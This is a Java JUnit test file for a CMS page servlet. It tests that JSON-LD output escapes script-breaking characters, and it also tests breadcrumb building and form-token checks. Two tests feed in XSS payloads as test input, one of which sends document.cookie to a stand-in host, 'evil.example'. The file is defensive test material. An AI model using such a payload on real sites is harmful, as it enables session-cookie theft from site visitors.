/*
 * Copyright 2026 SimIS Inc. (https://www.simiscms.com)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.simisinc.platform.presentation.controller;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.mockStatic;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.Test;
import org.mockito.MockedStatic;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.simisinc.platform.application.cms.LoadWebPageCommand;
import com.simisinc.platform.domain.model.cms.WebPage;
import com.simisinc.platform.domain.model.items.Collection;
import com.simisinc.platform.domain.model.items.Item;

/**
 * The JSON-LD block is rendered into main.jsp with
 * &lt;script type="application/ld+json"&gt;&lt;c:out value="${pageRenderInfo.jsonLdData}" escapeXml="false" /&gt;&lt;/script&gt;
 * -- escapeXml is intentionally false so the JSON syntax isn't HTML-entity-mangled, which means
 * generateJsonLdData is the only thing standing between admin/content-editor-supplied text
 * (item name, page title/description, site name) and a script-context breakout.
 *
 * @author elizabeth houser
 */
class PageServletTest {

  private static final ObjectMapper MAPPER = new ObjectMapper();

  @Test
  void escapeForInlineScriptNeutralizesHtmlBreakoutCharacters() {
    assertEquals("\\u003c/script\\u003e", PageServlet.escapeForInlineScript("</script>"));
    assertEquals("\\u003c!--", PageServlet.escapeForInlineScript("<!--"));
    assertEquals("a \\u0026\\u0026 b", PageServlet.escapeForInlineScript("a && b"));
    assertNull(PageServlet.escapeForInlineScript(null));
  }

  @Test
  void escapeForInlineScriptPreservesJsonMeaning() throws Exception {
    // The escaped form must still be valid JSON and decode back to the original text --
    // \u003c/\u003e/\u0026 are ordinary JSON string escapes, not a different encoding.
    String original = "<script>alert(document.cookie)</script> & \"quoted\"";
    String json = MAPPER.writeValueAsString(original);
    String escaped = PageServlet.escapeForInlineScript(json);
    JsonNode parsed = MAPPER.readTree(escaped);
    assertEquals(original, parsed.asText());
  }

  @Test
  void generateJsonLdDataEscapesAPoisonedItemName() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/products/widget");
    pageRenderInfo.setTitle("Widget");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    Item item = new Item();
    item.setName("</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>");
    item.setDescription("Also \"quoted\" and <b>bold</b>");

    String jsonLd;
    try (MockedStatic<LoadWebPageCommand> webPages = mockStatic(LoadWebPageCommand.class)) {
      webPages.when(() -> LoadWebPageCommand.loadByLink("/products")).thenReturn(null);
      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, item, null, "/products/widget");
    }

    assertFalse(jsonLd.toLowerCase().contains("</script"),
        "a poisoned item name must not be able to close the surrounding <script> tag: " + jsonLd);
    assertFalse(jsonLd.contains("<script>"), "a poisoned item name must not open a new <script> tag: " + jsonLd);

    // Still valid, semantically unchanged JSON once parsed
    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    // @graph = [Organization, WebPage, BreadcrumbList, Product] -- /products/widget is 2 levels deep
    JsonNode product = parsed.get("@graph").get(3);
    assertEquals("Product", product.get("@type").asText());
    assertTrue(product.get("name").asText().contains("</script><script>"));
  }

  @Test
  void generateJsonLdDataIncludesBreadcrumbListForANestedPage() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/legal/privacy");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    WebPage legalPage = new WebPage();
    legalPage.setTitle("Legal");

    String jsonLd;
    try (MockedStatic<LoadWebPageCommand> webPages = mockStatic(LoadWebPageCommand.class)) {
      webPages.when(() -> LoadWebPageCommand.loadByLink("/legal")).thenReturn(legalPage);
      jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, null, null, "/legal/privacy");
    }

    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    JsonNode breadcrumbList = parsed.get("@graph").get(2);
    assertEquals("BreadcrumbList", breadcrumbList.get("@type").asText());
    JsonNode items = breadcrumbList.get("itemListElement");
    assertEquals(3, items.size());
    assertEquals("Home", items.get(0).get("name").asText());
    assertEquals("Legal", items.get(1).get("name").asText());
  }

  @Test
  void generateJsonLdDataOmitsBreadcrumbListForATopLevelPage() {
    PageRenderInfo pageRenderInfo = new PageRenderInfo();
    pageRenderInfo.setPageUrl("https://example.org/about");

    Map<String, String> sitePropertyMap = new HashMap<>();
    sitePropertyMap.put("site.name", "Example Co");

    String jsonLd = PageServlet.generateJsonLdData(pageRenderInfo, "https://example.org", sitePropertyMap, null, null, "/about");

    JsonNode parsed = assertDoesNotThrow(() -> MAPPER.readTree(jsonLd));
    for (JsonNode node : parsed.get("@graph")) {
      assertFalse("BreadcrumbList".equals(node.get("@type").asText()),
          "a single-level page should not get a breadcrumb trail: " + jsonLd);
    }
  }

  @Test
  void computeBreadcrumbListReturnsNullForTheHomepage() {
    assertNull(PageServlet.computeBreadcrumbList("https://example.org", "/", null, null));
  }

  @Test
  void computeBreadcrumbListReturnsNullForATopLevelPage() {
    assertNull(PageServlet.computeBreadcrumbList("https://example.org", "/about", null, null));
  }

  @Test
  void computeBreadcrumbListReturnsNullWhenSiteUrlIsBlank() {
    assertNull(PageServlet.computeBreadcrumbList("", "/legal/privacy", null, null));
    assertNull(PageServlet.computeBreadcrumbList(null, "/legal/privacy", null, null));
  }

  @Test
  void computeBreadcrumbListUsesPageTitlesForEachAncestorSegment() {
    WebPage legalPage = new WebPage();
    legalPage.setTitle("Legal");
    WebPage privacyPage = new WebPage();
    privacyPage.setTitle("Privacy Policy");

    List<Map<String, Object>> items;
    try (MockedStatic<LoadWebPageCommand> webPages = mockStatic(LoadWebPageCommand.class)) {
      webPages.when(() -> LoadWebPageCommand.loadByLink("/legal")).thenReturn(legalPage);
      webPages.when(() -> LoadWebPageCommand.loadByLink("/legal/privacy")).thenReturn(privacyPage);
      items = PageServlet.computeBreadcrumbList("https://example.org", "/legal/privacy", null, null);
    }

    assertEquals(3, items.size());

    assertEquals(1, items.get(0).get("position"));
    assertEquals("Home", items.get(0).get("name"));
    assertEquals("https://example.org", items.get(0).get("item"));

    assertEquals(2, items.get(1).get("position"));
    assertEquals("Legal", items.get(1).get("name"));
    assertEquals("https://example.org/legal", items.get(1).get("item"));

    assertEquals(3, items.get(2).get("position"));
    assertEquals("Privacy Policy", items.get(2).get("name"));
    assertEquals("https://example.org/legal/privacy", items.get(2).get("item"));
  }

  @Test
  void computeBreadcrumbListHumanizesASegmentWithNoMatchingPage() {
    List<Map<String, Object>> items;
    try (MockedStatic<LoadWebPageCommand> webPages = mockStatic(LoadWebPageCommand.class)) {
      webPages.when(() -> LoadWebPageCommand.loadByLink(org.mockito.ArgumentMatchers.anyString())).thenReturn(null);
      items = PageServlet.computeBreadcrumbList("https://example.org", "/docs/getting-started", null, null);
    }

    assertEquals("Docs", items.get(1).get("name"));
    assertEquals("Getting Started", items.get(2).get("name"));
  }

  @Test
  void computeBreadcrumbListUsesItemAndCollectionNamesForAnItemDetailPageWithoutLookingThemUp() {
    Collection collection = new Collection();
    collection.setUniqueId("staff");
    collection.setName("Staff");
    Item item = new Item();
    item.setName("Jane Doe");

    List<Map<String, Object>> items;
    try (MockedStatic<LoadWebPageCommand> webPages = mockStatic(LoadWebPageCommand.class)) {
      webPages.when(() -> LoadWebPageCommand.loadByLink("/items")).thenReturn(null);
      items = PageServlet.computeBreadcrumbList("https://example.org", "/items/staff/jane-doe", item, collection);

      webPages.verify(() -> LoadWebPageCommand.loadByLink("/items/staff"), never());
      webPages.verify(() -> LoadWebPageCommand.loadByLink("/items/staff/jane-doe"), never());
    }

    assertEquals(4, items.size());
    assertEquals("Items", items.get(1).get("name"));
    assertEquals("Staff", items.get(2).get("name"));
    assertEquals("Jane Doe", items.get(3).get("name"));
  }

  @Test
  void computeBreadcrumbListUsesCollectionNameForACollectionListingPage() {
    Collection collection = new Collection();
    collection.setUniqueId("staff");
    collection.setName("Staff");

    List<Map<String, Object>> items;
    try (MockedStatic<LoadWebPageCommand> webPages = mockStatic(LoadWebPageCommand.class)) {
      webPages.when(() -> LoadWebPageCommand.loadByLink("/items")).thenReturn(null);
      items = PageServlet.computeBreadcrumbList("https://example.org", "/items/staff", null, collection);
    }

    assertEquals(3, items.size());
    assertEquals("Items", items.get(1).get("name"));
    assertEquals("Staff", items.get(2).get("name"));
  }

  @Test
  void humanizeUrlSegmentTitleCasesHyphenatedAndUnderscoredWords() {
    assertEquals("Getting Started", PageServlet.humanizeUrlSegment("getting-started"));
    assertEquals("Getting Started", PageServlet.humanizeUrlSegment("getting_started"));
    assertEquals("Faq", PageServlet.humanizeUrlSegment("faq"));
  }

  @Test
  void isFormTokenValidAcceptsAMatchingToken() {
    assertTrue(PageServlet.isFormTokenValid("abc-123", "abc-123"));
  }

  @Test
  void isFormTokenValidRejectsAMismatchedToken() {
    assertFalse(PageServlet.isFormTokenValid("wrong-token", "abc-123"));
  }

  @Test
  void isFormTokenValidRejectsABlankOrMissingRequestToken() {
    assertFalse(PageServlet.isFormTokenValid("", "abc-123"));
    assertFalse(PageServlet.isFormTokenValid(null, "abc-123"));
  }

  @Test
  void isFormTokenValidRejectsANullSessionToken() {
    assertFalse(PageServlet.isFormTokenValid("abc-123", null));
  }
}
